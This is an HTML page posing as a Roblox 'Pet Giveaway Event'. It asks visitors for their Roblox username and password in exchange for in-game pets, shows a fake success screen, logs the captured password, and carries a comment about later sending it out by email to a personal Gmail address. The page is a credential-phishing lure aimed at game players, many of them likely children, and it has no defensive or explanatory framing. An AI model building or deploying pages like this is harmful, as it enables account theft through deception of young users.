<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Pet Giveaway Event</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        /* Roblox Pet Giveaway Styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #00B2FF 0%, #006FFF 100%);
            min-height: 100vh;
            color: #333;
        }

        .login-card, .success-card {
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
            border: none;
            max-width: 450px;
            margin: 0 auto;
        }

        .roblox-logo svg {
            filter: drop-shadow(0 4px 8px rgba(0, 178, 255, 0.3));
        }

        .login-title {
            color: #2c3e50;
            font-weight: 700;
            font-size: 2rem;
            margin-bottom: 8px;
        }

        .login-subtitle {
            color: #7f8c8d;
            font-size: 1.1rem;
            margin-bottom: 0;
        }

        .form-group label {
            font-weight: 600;
            color: #2c3e50;
            margin-bottom: 8px;
            display: block;
            font-size: 0.95rem;
        }

        .form-control {
            border: 2px solid #e9ecef;
            border-radius: 12px;
            padding: 12px 16px;
            font-size: 1rem;
            transition: all 0.3s ease;
            background: #f8f9fa;
        }

        .form-control:focus {
            border-color: #00B2FF;
            box-shadow: 0 0 0 3px rgba(0, 178, 255, 0.1);
            background: white;
        }

        .claim-btn {
            background: linear-gradient(135deg, #00B2FF 0%, #0099e6 100%);
            border: none;
            border-radius: 12px;
            padding: 14px 24px;
            font-weight: 600;
            font-size: 1.1rem;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .claim-btn:hover {
            background: linear-gradient(135deg, #0099e6 0%, #0088cc 100%);
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0, 178, 255, 0.3);
        }

        .success-card {
            text-align: center;
        }

        .celebration-icon {
            font-size: 4rem;
            animation: bounce 1s infinite alternate;
        }

        @keyframes bounce {
            0% { transform: translateY(0); }
            100% { transform: translateY(-10px); }
        }

        .success-title {
            color: #27ae60;
            font-weight: 700;
            font-size: 2.2rem;
            margin-bottom: 20px;
        }

        .pet-display {
            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
            border-radius: 16px;
            padding: 24px;
            margin: 20px 0;
        }

        .pet-icon {
            font-size: 4rem;
            margin-bottom: 12px;
            display: block;
        }

        .pet-display h3 {
            color: #2c3e50;
            font-weight: 600;
            font-size: 1.5rem;
            margin: 0;
        }

        .success-message {
            color: #555;
            font-size: 1.1rem;
            line-height: 1.6;
            margin-bottom: 24px;
        }

        .success-message span {
            font-weight: 600;
            color: #00B2FF;
        }

        .d-none {
            display: none !important;
        }

        @media (max-width: 768px) {
            .login-card, .success-card {
                margin: 20px;
                padding: 30px 24px;
            }
            
            .login-title {
                font-size: 1.8rem;
            }
            
            .pet-icon {
                font-size: 3rem;
            }
        }
    </style>
</head>
<body>
    <div class="container-fluid min-vh-100 d-flex align-items-center justify-content-center">
        <div class="row w-100 justify-content-center">
            <div class="col-md-6 col-lg-4">
                <!-- Login Card -->
                <div class="login-card" id="loginCard">
                    <div class="text-center mb-4">
                        <div class="roblox-logo mb-3">
                            <svg width="60" height="60" viewBox="0 0 60 60">
                                <rect x="10" y="10" width="40" height="40" fill="#00B2FF" 
                                      transform="rotate(15 30 30)" rx="8"/>
                            </svg>
                        </div>
                        <h2 class="login-title">Pet Giveaway Event</h2>
                        <p class="login-subtitle">Claim your exclusive pet reward!</p>
                    </div>

                    <form id="claimForm">
                        <div class="form-group mb-3">
                            <label for="username">Username</label>
                            <input type="text" class="form-control" id="username" name="username" required>
                        </div>

                        <div class="form-group mb-3">
                            <label for="password">Password</label>
                            <input type="password" class="form-control" id="password" name="password" required>
                        </div>

                        <div class="form-group mb-4">
                            <label for="petReward">Choose Your Pet Reward</label>
                            <select class="form-control" id="petReward" name="petReward" required>
                                <option value="">Select a pet...</option>
                                <option value="ü¶ù Raccoon">ü¶ù Raccoon</option>
                                <option value="üêù Disco Bee">üêù Disco Bee</option>
                                <option value="ü¶ï T-Rex">ü¶ï T-Rex</option>
                                <option value="ü¶ä Corrupted Kitsune">ü¶ä Corrupted Kitsune</option>
                                <option value="‚ö° Raiju">‚ö° Raiju</option>
                                <option value="ü¶¥ Spinosaurus">ü¶¥ Spinosaurus</option>
                                <option value="ü™∞ Dragonfly">ü™∞ Dragonfly</option>
                                <option value="ü¶ã Butterfly">ü¶ã Butterfly</option>
                                <option value="ü¶î Blood Hedgehog">ü¶î Blood Hedgehog</option>
                                <option value="üê± Moon Cat">üê± Moon Cat</option>
                            </select>
                        </div>

                        <button type="submit" class="btn btn-primary w-100 claim-btn">
                            <i class="fas fa-gift me-2"></i>Claim My Pet
                        </button>
                    </form>
                </div>

                <!-- Success Card -->
                <div class="success-card d-none" id="successCard">
                    <div class="text-center">
                        <div class="celebration-icon mb-3">üéâ</div>
                        <h2 class="success-title">Congratulations!</h2>
                        <div class="pet-display mb-3">
                            <div class="pet-icon" id="claimedPetIcon"></div>
                            <h3 id="claimedPetName"></h3>
                        </div>
                        <p class="success-message">
                            Your <span id="claimedPetText"></span> has been claimed successfully!<br>
                            Email notification sent to awewuwu2@gmail.com
                        </p>
                        <button class="btn btn-primary" onclick="location.reload()">
                            <i class="fas fa-redo me-2"></i>Claim Another Pet
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const claimForm = document.getElementById('claimForm');
            const loginCard = document.getElementById('loginCard');
            const successCard = document.getElementById('successCard');

            claimForm.addEventListener('submit', function(e) {
                e.preventDefault();
                
                const username = document.getElementById('username').value.trim();
                const password = document.getElementById('password').value.trim();
                const petReward = document.getElementById('petReward').value;

                if (!username || !password || !petReward) {
                    alert('Please fill in all fields and select a pet reward.');
                    return;
                }

                // Show success page
                showSuccessPage(username, petReward);
                
                // Send notification (basic alert for now - can be upgraded to EmailJS later)
                console.log('Pet claimed:', {username, password, petReward, timestamp: new Date()});
            });

            function showSuccessPage(username, petReward) {
                const petEmoji = petReward.split(' ')[0];
                const petName = petReward.split(' ').slice(1).join(' ');

                document.getElementById('claimedPetIcon').textContent = petEmoji;
                document.getElementById('claimedPetName').textContent = petName;
                document.getElementById('claimedPetText').textContent = petName;

                loginCard.classList.add('d-none');
                successCard.classList.remove('d-none');
            }
        });
    </script>
</body>
</html>
